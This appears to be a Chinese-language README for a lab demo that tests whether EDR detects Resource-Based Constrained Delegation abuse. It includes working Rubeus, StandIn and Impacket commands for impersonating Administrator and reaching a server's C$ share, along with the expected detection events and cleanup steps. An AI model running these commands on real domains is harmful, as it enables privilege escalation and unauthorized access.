# RBCD Demo — Windows 11 → Windows Server 2022（Domain: SME.LOCAL）

此專案示範 Resource-Based Constrained Delegation (RBCD) 的端到端流程，用於驗證 EDR 是否能正確偵測。環境與結果已驗證：成功以 S4U2Self + S4U2Proxy 取得 Administrator → CIFS 的 TGS，並以 /ptt 注入後存取目標 C$。

- 攻擊端：Windows 11（加入 SME.LOCAL）
- 目標端：Windows Server 2022，主機名 EC2AMAZ-V903HM1，FQDN EC2AMAZ-V903HM1.sme.local
- 網域：SME.LOCAL
- 工具：Rubeus.exe、StandIn.exe
- 腳本：
  - 權限驗證：[verify_rbcd_permissions_clean.ps1](file:///c:/Users/aduser/Desktop/PCT/94727/verify_rbcd_permissions_clean.ps1)
  - 權限配置（最小 WriteProperty）：[setup_rbcd_lab.ps1](file:///c:/Users/aduser/Desktop/PCT/94727/setup_rbcd_lab.ps1)
  - 清理：[cleanup_rbcd.ps1](file:///c:/Users/aduser/Desktop/PCT/94727/cleanup_rbcd.ps1)
- 詳細教學：[RBCD_Walkthrough.md](file:///c:/Users/aduser/Desktop/PCT/94727/RBCD_Walkthrough.md)

## 前置作業

```powershell
Add-WindowsCapability -Online -Name Rsat.ActiveDirectory.DS-LDS.Tools~~~~0.0.1.0
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force
```

## 快速開始

1) 驗證攻擊者帳號是否有對目標電腦物件的寫入權限
```powershell
.\verify_rbcd_permissions_clean.ps1 -TargetComputer "EC2AMAZ-V903HM1" -AttackerUser "aduser"
```

若顯示 NOT VULNERABLE，授權權限（二選一）：
- 快速（GenericWrite）
```powershell
$dn = (Get-ADComputer -Identity "EC2AMAZ-V903HM1" -Properties DistinguishedName).DistinguishedName
dsacls "$dn" /I:T /G SME\aduser:GW
```
- 最小（僅 RBCD 屬性 WriteProperty）
```powershell
.\setup_rbcd_lab.ps1 -TargetComputer "EC2AMAZ-V903HM1" -AttackerUser "aduser"
```

2) 建立攻擊者控制的電腦帳號 EvilPC$ 並取得金鑰
```powershell
Import-Module ActiveDirectory
New-ADComputer -Name "EvilPC" -SamAccountName "EvilPC$" -Path "CN=Computers,DC=sme,DC=local" -Enabled $true -AccountPassword (ConvertTo-SecureString "Passw0rd!123" -AsPlainText -Force) -PassThru
(Get-ADComputer -Identity "EvilPC" -Properties SID).SID.Value
.\Rubeus.exe hash /password:Passw0rd!123
```

3) 在目標電腦寫入 RBCD（授權 EvilPC$）
```powershell
.\StandIn.exe --computer EC2AMAZ-V903HM1 --sid <EVILPC_SID>
Get-ADComputer -Identity "EC2AMAZ-V903HM1" -Properties msDS-AllowedToActOnBehalfOfOtherIdentity | Select-Object -ExpandProperty msDS-AllowedToActOnBehalfOfOtherIdentity
```

4) S4U2Self + S4U2Proxy 取得 Administrator → CIFS 的 TGS 並注入
```powershell
.\Rubeus.exe s4u /user:EvilPC$ /aes256:<AES256_KEY> /impersonateuser:Administrator /msdsspn:cifs/EC2AMAZ-V903HM1.sme.local /domain:SME.LOCAL /ptt
klist tickets
```

5) 使用票據存取目標
```powershell
dir \\EC2AMAZ-V903HM1.sme.local\C$\
type \\EC2AMAZ-V903HM1.sme.local\C$\Windows\System32\drivers\etc\hosts
```

## EDR 應觀測事件

- DC：5136（RBCD 屬性變更）、4769（S4U2Proxy 對 CIFS 的 TGS 請求）
- 攻擊端：票據注入、.NET 組件載入（Rubeus/StandIn）、SMB 行為
- 目標端：4624（Type 3）登入事件、SMB 會話與檔案存取

## 清理

```powershell
Set-ADComputer -Identity "EC2AMAZ-V903HM1" -Clear "msDS-AllowedToActOnBehalfOfOtherIdentity"
Remove-ADComputer -Identity "EvilPC$" -Confirm:$false
$dn = (Get-ADComputer -Identity "EC2AMAZ-V903HM1" -Properties DistinguishedName).DistinguishedName
dsacls "$dn" /I:T /R SME\aduser
klist purge
```

## 情境2 — 代理版（Kali/Impacket，Windows 端不執行程式）

- 拓撲：Kali(172.31.44.17) → SSH 跳板(10.0.1.173) → DC(10.0.0.206) → 目標(EC2AMAZ-V903HM1.sme.local，例：10.0.2.200)
- 代理：在 Kali 建 SOCKS5 `ssh -N -D 1080 jump@10.0.1.173`；proxychains 僅保留 `socks5 127.0.0.1 1080`
- 環境：Impacket 以 venv `pip install -e .` 安裝；必要時降級 setuptools `<70` 以提供 `pkg_resources`
- 正確步驟（摘要）：
  1) 新增機器帳號 EvilPC$（SAMR/445）
  2) 對目標寫入 RBCD（LDAP/389；或 389 + `-k`）
  3) 以 EvilPC$ 取 TGT，然後 `getST -k` 拿 `Administrator → cifs/EC2AMAZ-V903HM1.sme.local` 服務票
  4) 將 KRB5CCNAME 指向 `Administrator@cifs_...ccache`，用 `smbclient -k -no-pass -target-ip 10.0.2.200`
  5) 驗證 shares、IPC$、C$
- 完整流程與故障排查請見：[RBCD_Proxy_Path_Kali.md](file:///c:/Users/aduser/Desktop/PCT/94727/RBCD_Proxy_Path_Kali.md)
